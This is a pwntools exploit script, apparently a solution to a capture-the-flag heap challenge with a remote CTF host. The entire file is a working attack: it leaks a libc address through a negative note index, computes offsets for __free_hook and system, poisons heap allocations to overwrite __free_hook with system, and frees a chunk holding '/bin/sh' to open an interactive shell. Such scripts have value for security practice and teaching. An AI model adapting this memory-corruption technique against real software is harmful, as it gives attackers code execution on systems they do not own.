from pwn import *


def conn():
    if args.REMOTE:
        HOST, PORT = "pwn.chal.ctf.gdgalgiers.com", 1405
        p = remote(HOST, PORT)
    else:
        p = process("./chall")
    return p


def add_note(size, content):
    p.sendlineafter("option: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("content: ", content)


def delete_note(index):
    p.sendlineafter("option: ", "2")
    p.sendlineafter("index: ", str(index))


def view_note(index):
    p.sendlineafter("option: ", "4")
    p.sendlineafter("Index: ", str(index))


def main():
    global p
    p = conn()

    # getting libc
    view_note(-2)
    p.recvuntil(b": ")
    stderr_addr = p.recv(14)
    stderr_addr = int(stderr_addr, 16)
    log.info(f"Stderr addr: {hex(stderr_addr)}")
    libc_base = stderr_addr - 0x1C0680
    log.info(f"Libc base: {hex(libc_base)}")
    free_hook = libc_base + 0x1C25A8
    system = libc_base + 0x2DFD0
    log.info(f"free hook: {hex(free_hook)}")
    log.info(f"system: {hex(system)}")
    add_note(0x58, b"A" * 0x58)  # 0
    add_note(0x180, b"B" * 0x180)  # 1

    delete_note(0)
    delete_note(1)

    add_note(0x58, b"C" * 0x58)  # 0
    delete_note(1)
    add_note(0x180, p64(free_hook))
    add_note(0x80, b"/bin/sh\x00" + b"A" * (0x80 - len(b"/bin/sh\x00")))
    add_note(0x80, p64(system) + b"\x00" * (0x80 - len(p64(system))))

    delete_note(0)
    # gdb.attach(p)
    p.interactive()


if __name__ == "__main__":
    main()
